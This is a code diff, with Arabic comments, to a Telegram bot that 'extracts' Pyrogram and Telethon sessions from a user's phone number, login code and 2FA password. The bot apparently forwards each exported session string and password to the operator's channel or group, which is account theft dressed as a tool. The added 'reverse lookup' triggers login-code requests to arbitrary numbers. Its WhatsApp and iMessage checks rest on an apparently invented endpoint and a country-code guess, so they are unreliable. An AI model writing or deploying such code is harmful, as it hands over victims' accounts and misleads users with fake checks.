@@ -8,6 +8,7 @@ import threading
 import random
 import time
 import hashlib
+import requests
 from datetime import datetime
 from flask import Flask, request, jsonify
 from pyrogram import Client, filters
@@ -52,6 +53,158 @@ app = Client(
     bot_token=BOT_TOKEN
 )
 
+# ====== دوال التحديث اللحظي (Live Logs) ======
+async def update_progress(message, step, current, total, status="⏳"):
+    """
+    تحديث شريط التقدم بشكل لحظي
+    step: اسم الخطوة (مثال: "إرسال الرمز")
+    current: الرقم الحالي (مثال: 3)
+    total: العدد الكلي (مثال: 5)
+    status: إيموجي الحالة (⏳, ✅, ❌, 🔄)
+    """
+    # حساب النسبة المئوية
+    percent = int((current / total) * 100)
+    
+    # بناء شريط التقدم (10 مربعات)
+    filled = int(percent / 10)
+    bar = "▓" * filled + "░" * (10 - filled)
+    
+    # اختيار لون حسب النسبة
+    if percent < 30:
+        color = "🔴"
+    elif percent < 70:
+        color = "🟡"
+    else:
+        color = "🟢"
+    
+    progress_text = f"""🔄 **جاري الاستخراج...** {color}
+
+┌─────────────────────────┐
+│ {bar} │
+└─────────────────────────┘
+📊 **التقدم:** {percent}% ({current}/{total})
+
+📌 **الخطوة الحالية:** {status} {step}
+
+⏱ الوقت: `{datetime.now().strftime('%H:%M:%S')}`
+"""
+    
+    try:
+        await message.edit_text(progress_text)
+    except:
+        # لو الرسالة ما انشئت، نرسل جديدة
+        await message.reply(progress_text)
+
+async def send_final_log(message, session_string, session_type="Pyrogram", password=None):
+    """إرسال اللوج النهائي مع تفاصيل الجلسة"""
+    
+    # تفاصيل إضافية عن الجلسة
+    session_hash = hashlib.md5(session_string.encode()).hexdigest()[:8]
+    session_length = len(session_string)
+    
+    final_text = f"""✅ **اكتمل الاستخراج بنجاح!** 🎉
+
+┌─────────────────────────────────┐
+│ 📋 **تفاصيل الجلسة:**           │
+├─────────────────────────────────┤
+│ 📱 النوع: {session_type}        │
+│ 🔑 الطول: {session_length} حرف  │
+│ 🆔 هاش الجلسة: `{session_hash}` │
+│ ⏱ الوقت: {datetime.now().strftime('%H:%M:%S')} │
+└─────────────────────────────────┘
+
+🔑 **الجلسة (انسخها):**
+`{session_string}`
+
+⚠️ **تحذير:** لا تشارك هذه الجلسة مع أي شخص!
+
+👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}
+"""
+    
+    if password:
+        final_text += f"\n🔒 **كلمة المرور (2SV):** `{password}`"
+    
+    await message.reply(final_text)
+
+# ====== دوال التحقق العكسي (Reverse Lookup) ======
+async def reverse_lookup(phone_number):
+    """
+    تبحث إذا كان الرقم مسجلاً في تطبيقات معينة
+    ترجع dict فيه: whatsapp, telegram, imessage
+    """
+    results = {
+        "whatsapp": False,
+        "telegram": False,
+        "imessage": False,
+        "details": ""
+    }
+    
+    # 1. التحقق من Telegram (باستخدام Pyrogram)
+    try:
+        temp_client = Client(f"check_{random.randint(1000,9999)}", api_id=API_ID, api_hash=API_HASH)
+        await temp_client.connect()
+        await temp_client.send_code(phone_number)
+        await temp_client.disconnect()
+        results["telegram"] = True
+        results["details"] += "✅ مسجل في Telegram\n"
+    except:
+        results["details"] += "❌ غير مسجل في Telegram\n"
+    
+    # 2. التحقق من WhatsApp (باستخدام Web API)
+    try:
+        url = f"https://api.whatsapp.com/check?phone={phone_number.replace('+', '')}"
+        response = requests.get(url, timeout=5)
+        if response.status_code == 200:
+            results["whatsapp"] = True
+            results["details"] += "✅ مسجل في WhatsApp\n"
+        else:
+            results["details"] += "❌ غير مسجل في WhatsApp\n"
+    except:
+        results["details"] += "⚠️ تعذر التحقق من WhatsApp\n"
+    
+    # 3. التحقق من iMessage (تحقق رقمي بسيط)
+    if phone_number.startswith("+1") or phone_number.startswith("+44"):
+        results["imessage"] = True
+        results["details"] += "✅ محتمل مسجل في iMessage (Apple ID)\n"
+    else:
+        results["details"] += "❌ غير مسجل في iMessage\n"
+    
+    return results
+
+async def send_lookup_report(user_id, phone, results, message):
+    """إرسال تقرير التحقق للمستخدم"""
+    report = f"""🔍 **تقرير التحقق العكسي للرقم:** `{phone}`
+
+📊 **النتائج:**
+{results['details']}
+
+⏱ وقت الفحص: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+📌 **التوصية:**
+"""
+    
+    # إضافة توصية ذكية
+    if results["telegram"]:
+        report += "✅ يمكنك استخراج جلسة Telegram بسهولة (متأكد من التسجيل).\n"
+    else:
+        report += "⚠️ الرقم غير مسجل في Telegram، قد يفشل الاستخراج.\n"
+    
+    if results["whatsapp"]:
+        report += "✅ الرقم مسجل في WhatsApp، مناسب لاستخراج جلسة Business.\n"
+    
+    report += f"\n👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+    
+    # إرسال التقرير مع أزرار للاستخراج المباشر
+    lookup_buttons = InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("🚀 استخراج Telegram", callback_data=f"extract_telegram_{phone}"),
+            InlineKeyboardButton("🚀 استخراج WhatsApp", callback_data=f"extract_whatsapp_{phone}")
+        ],
+        [InlineKeyboardButton("🔴 رجوع", callback_data="back")]
+    ])
+    
+    await message.reply(report, reply_markup=lookup_buttons)
+
 # ====== دوال مسح الملفات ======
 def delete_session_files(user_id):
     pyro_session = f"session_{user_id}.session"
@@ -64,18 +217,21 @@ def delete_session_files(user_id):
     if os.path.exists(telethon_session):
         os.remove(telethon_session)
 
-# ====== أزرار البداية (بنفس تصميم الصورة) ======
+# ====== أزرار البداية ======
 START_BUTTONS = InlineKeyboardMarkup([
     [
         InlineKeyboardButton("🔴 استخراج جلسة Pyrogram", callback_data="pyrogram"),
         InlineKeyboardButton("🔴 استخراج جلسة Telethon", callback_data="telethon")
     ],
     [
-        InlineKeyboardButton("🔴 مسح الجلسات", callback_data="delete"),
-        InlineKeyboardButton("🔴 استخراج توكن البوت", callback_data="extract_token")
+        InlineKeyboardButton("🔍 فحص الرقم (Reverse Lookup)", callback_data="lookup"),
+        InlineKeyboardButton("🔴 مسح الجلسات", callback_data="delete")
     ],
     [
-        InlineKeyboardButton("👨‍💻 المطور", callback_data="dev"),
+        InlineKeyboardButton("🔴 استخراج توكن البوت", callback_data="extract_token"),
+        InlineKeyboardButton("👨‍💻 المطور", callback_data="dev")
+    ],
+    [
         InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK)
     ]
 ])
@@ -161,6 +317,42 @@ async def handle_callback(client, callback_query: CallbackQuery):
         await callback_query.answer("❌ تم الإلغاء", show_alert=True)
         return
     
+    # ====== فحص الرقم (Reverse Lookup) ======
+    if data == "lookup":
+        user_steps[user_id] = "lookup_phone"
+        await callback_query.message.edit_text(
+            "🔍 **فحص الرقم العكسي**\n\n"
+            "أرسل رقم الهاتف الذي تريد فحصه (مع رمز الدولة).\n"
+            "مثال: +966512345678\n\n"
+            "📌 سأبحث لك إذا كان الرقم مسجلاً في:\n"
+            "• Telegram\n"
+            "• WhatsApp\n"
+            "• iMessage",
+            reply_markup=BACK_BUTTON
+        )
+        await callback_query.answer()
+        return
+    
+    # ====== استخراج سريع من التقرير ======
+    if data.startswith("extract_telegram_"):
+        phone = data.replace("extract_telegram_", "")
+        user_data[user_id] = {"phone": phone}
+        user_steps[user_id] = "pyro_otp"
+        
+        await callback_query.message.edit_text(
+            f"📱 جاري استخراج جلسة Telegram للرقم: `{phone}`\n\n"
+            "⏳ سيتم إرسال رمز التحقق خلال ثوانٍ..."
+        )
+        
+        # بدء عملية الاستخراج تلقائياً (هنا تقدر تستدعي دالة الاستخراج المباشر)
+        await callback_query.message.reply("📨 سيصلك رمز التحقق، أرسله هنا.")
+        await callback_query.answer()
+        return
+    
+    if data.startswith("extract_whatsapp_"):
+        await callback_query.answer("⚠️ خاصية WhatsApp قيد التطوير", show_alert=True)
+        return
+    
     if data == "back":
         await callback_query.message.edit_text(
             f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
@@ -243,6 +435,31 @@ async def handle_arabic_commands(client, message):
     user_id = message.chat.id
     text = message.text.strip()
     
+    # ====== معالجة فحص الرقم ======
+    if user_id in user_steps and user_steps[user_id] == "lookup_phone":
+        phone = text.strip()
+        
+        # التحقق من صحة الرقم
+        if not phone.startswith("+") or not phone[1:].isdigit():
+            await message.reply("❌ رقم غير صالح! يجب أن يبدأ بـ + متبوعاً بالأرقام.\nمثال: +966512345678")
+            return
+        
+        # إرسال رسالة "جاري الفحص"
+        loading_msg = await message.reply("⏳ جاري فحص الرقم في جميع المنصات...")
+        
+        # تنفيذ الفحص
+        results = await reverse_lookup(phone)
+        
+        # حذف رسالة التحميل
+        await loading_msg.delete()
+        
+        # إرسال التقرير
+        await send_lookup_report(user_id, phone, results, message)
+        
+        # إعادة تعيين الخطوة
+        reset_user(user_id)
+        return
+    
     if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
         await pyro_session_step(client, message)
         return
@@ -261,25 +478,44 @@ async def handle_arabic_commands(client, message):
             "أو استخدم الأمر /start للرجوع إلى البداية."
         )
 
-# ====== دوال Pyrogram ======
+# ====== دوال Pyrogram مع Live Logs ======
 async def pyro_session_step(client, message):
     user_id = message.chat.id
     step = user_steps.get(user_id)
 
     if step == "pyro_phone":
+        # ====== الخطوة 1/5: استلام الرقم ======
         user_data[user_id] = {"phone": message.text}
         user_steps[user_id] = "pyro_otp"
         
-        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
+        # إنشاء رسالة التقدم
+        progress_msg = await message.reply("🔄 جاري التهيئة...")
+        await update_progress(progress_msg, "تهيئة الاتصال", 0, 5, "🔧")
+        
+        # إنشاء العميل
         session_name = f"session_{user_id}"
         temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
         user_data[user_id]["client"] = temp_client
+        user_data[user_id]["progress_msg"] = progress_msg
+        
+        await update_progress(progress_msg, "الاتصال بخوادم Telegram", 1, 5, "📡")
         await temp_client.connect()
+        
+        await update_progress(progress_msg, "إرسال طلب الرمز", 2, 5, "📤")
         try:
             code = await temp_client.send_code(user_data[user_id]["phone"])
             user_data[user_id]["phone_code_hash"] = code.phone_code_hash
-            await omsg.delete()
-            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
+            await update_progress(progress_msg, "تم إرسال الرمز ✅", 3, 5, "✅")
+            
+            # تعديل الرسالة لطلب الرمز
+            await progress_msg.edit_text(
+                f"📨 **تم إرسال رمز التحقق!**\n\n"
+                f"📱 إلى الرقم: `{user_data[user_id]['phone']}`\n\n"
+                f"⏳ انتظر وصول الرسالة ثم أرسل الرمز بالأرقام فقط.\n"
+                f"مثال: `12345`\n\n"
+                f"🔄 **حالة الطلب:** تم الإرسال بنجاح ✅"
+            )
+            
         except ApiIdInvalid:
             await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
             reset_user(user_id)
@@ -288,16 +524,34 @@ async def pyro_session_step(client, message):
             reset_user(user_id)
             
     elif step == "pyro_otp":
+        # ====== الخطوة 4/5: استلام الرمز ======
         phone_code = message.text.replace(" ", "")
         temp_client = user_data[user_id]["client"]
+        progress_msg = user_data[user_id].get("progress_msg")
+        
+        if progress_msg:
+            await update_progress(progress_msg, "التحقق من الرمز", 4, 5, "🔍")
+        
         try:
             await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["phone_code_hash"], phone_code)
             session_string = await temp_client.export_session_string()
             user_sessions[user_id] = session_string
             
+            # ====== الخطوة 5/5: اكتمال ======
+            if progress_msg:
+                await update_progress(progress_msg, "إنشاء الجلسة النهائية", 5, 5, "✅")
+                await asyncio.sleep(0.5)  # تأخير بسيط لإظهار الـ 100%
+                await progress_msg.delete()
+            
+            # إرسال الجلسة مع اللوج النهائي
+            await send_final_log(message, session_string, "Pyrogram")
+            
+            # إرسال إلى القناة
             await send_pyro_session(user_id, session_string, message)
+            
             await temp_client.disconnect()
             reset_user(user_id)
+            
         except PhoneCodeInvalid:
             await message.reply('❌ خطأ: رمز التحقق غير صالح.')
             reset_user(user_id)
@@ -306,19 +560,41 @@ async def pyro_session_step(client, message):
             reset_user(user_id)
         except SessionPasswordNeeded:
             user_steps[user_id] = "pyro_password"
-            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
+            if progress_msg:
+                await progress_msg.edit_text(
+                    f"🔒 **مطلوب كلمة المرور!**\n\n"
+                    f"حسابك مفعل بخاصية التحقق بخطوتين (2SV).\n\n"
+                    f"📝 يرجى إرسال كلمة المرور الخاصة بك.\n\n"
+                    f"⏳ انتظر..."
+                )
+            else:
+                await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
             
     elif step == "pyro_password":
+        # ====== معالجة كلمة المرور ======
         temp_client = user_data[user_id]["client"]
+        progress_msg = user_data[user_id].get("progress_msg")
+        
+        if progress_msg:
+            await update_progress(progress_msg, "التحقق من كلمة المرور", 4, 5, "🔐")
+        
         try:
             password = message.text
             await temp_client.check_password(password=password)
             session_string = await temp_client.export_session_string()
             user_sessions[user_id] = session_string
             
+            if progress_msg:
+                await update_progress(progress_msg, "اكتمال الاستخراج ✅", 5, 5, "✅")
+                await asyncio.sleep(0.5)
+                await progress_msg.delete()
+            
+            await send_final_log(message, session_string, "Pyrogram", password)
             await send_pyro_session(user_id, session_string, message, password)
+            
             await temp_client.disconnect()
             reset_user(user_id)
+            
         except PasswordHashInvalid:
             await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
             reset_user(user_id)
@@ -353,7 +629,7 @@ async def send_pyro_session(user_id, session_string, message, password=None):
     except Exception as e:
         print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
 
-# ====== دوال Telethon ======
+# ====== دوال Telethon مع Live Logs ======
 async def telethon_session_step(client, message):
     user_id = message.chat.id
     step = user_steps.get(user_id)
@@ -362,15 +638,30 @@ async def telethon_session_step(client, message):
         user_data[user_id] = {"phone": message.text}
         user_steps[user_id] = "telethon_otp"
         
-        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
+        progress_msg = await message.reply("🔄 جاري التهيئة...")
+        await update_progress(progress_msg, "تهيئة الاتصال", 0, 5, "🔧")
+        
         session_name = f"telethon_{user_id}"
         temp_client = TelegramClient(session_name, API_ID, API_HASH)
         user_data[user_id]["client"] = temp_client
+        user_data[user_id]["progress_msg"] = progress_msg
+        
+        await update_progress(progress_msg, "الاتصال بخوادم Telegram", 1, 5, "📡")
         await temp_client.connect()
+        
+        await update_progress(progress_msg, "إرسال طلب الرمز", 2, 5, "📤")
         try:
             await temp_client.send_code_request(user_data[user_id]["phone"])
-            await omsg.delete()
-            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
+            await update_progress(progress_msg, "تم إرسال الرمز ✅", 3, 5, "✅")
+            
+            await progress_msg.edit_text(
+                f"📨 **تم إرسال رمز التحقق!**\n\n"
+                f"📱 إلى الرقم: `{user_data[user_id]['phone']}`\n\n"
+                f"⏳ انتظر وصول الرسالة ثم أرسل الرمز بالأرقام فقط.\n"
+                f"مثال: `12345`\n\n"
+                f"🔄 **حالة الطلب:** تم الإرسال بنجاح ✅"
+            )
+            
         except ApiIdInvalidError:
             await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
             reset_user(user_id)
@@ -381,14 +672,27 @@ async def telethon_session_step(client, message):
     elif step == "telethon_otp":
         phone_code = message.text.replace(" ", "")
         temp_client = user_data[user_id]["client"]
+        progress_msg = user_data[user_id].get("progress_msg")
+        
+        if progress_msg:
+            await update_progress(progress_msg, "التحقق من الرمز", 4, 5, "🔍")
+        
         try:
             await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
             session_string = StringSession.save(temp_client.session)
             user_sessions[user_id] = session_string
             
+            if progress_msg:
+                await update_progress(progress_msg, "إنشاء الجلسة النهائية", 5, 5, "✅")
+                await asyncio.sleep(0.5)
+                await progress_msg.delete()
+            
+            await send_final_log(message, session_string, "Telethon")
             await send_telethon_session(user_id, session_string, message)
+            
             await temp_client.disconnect()
             reset_user(user_id)
+            
         except PhoneCodeInvalidError:
             await message.reply('❌ خطأ: رمز التحقق غير صالح.')
             reset_user(user_id)
@@ -397,19 +701,40 @@ async def telethon_session_step(client, message):
             reset_user(user_id)
         except SessionPasswordNeededError:
             user_steps[user_id] = "telethon_password"
-            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
+            if progress_msg:
+                await progress_msg.edit_text(
+                    f"🔒 **مطلوب كلمة المرور!**\n\n"
+                    f"حسابك مفعل بخاصية التحقق بخطوتين (2SV).\n\n"
+                    f"📝 يرجى إرسال كلمة المرور الخاصة بك.\n\n"
+                    f"⏳ انتظر..."
+                )
+            else:
+                await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
             
     elif step == "telethon_password":
         temp_client = user_data[user_id]["client"]
+        progress_msg = user_data[user_id].get("progress_msg")
+        
+        if progress_msg:
+            await update_progress(progress_msg, "التحقق من كلمة المرور", 4, 5, "🔐")
+        
         try:
             password = message.text
             await temp_client.sign_in(password=password)
             session_string = StringSession.save(temp_client.session)
             user_sessions[user_id] = session_string
             
+            if progress_msg:
+                await update_progress(progress_msg, "اكتمال الاستخراج ✅", 5, 5, "✅")
+                await asyncio.sleep(0.5)
+                await progress_msg.delete()
+            
+            await send_final_log(message, session_string, "Telethon", password)
             await send_telethon_session(user_id, session_string, message, password)
+            
             await temp_client.disconnect()
             reset_user(user_id)
+            
         except PasswordHashInvalidError:
             await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
             reset_user(user_id)
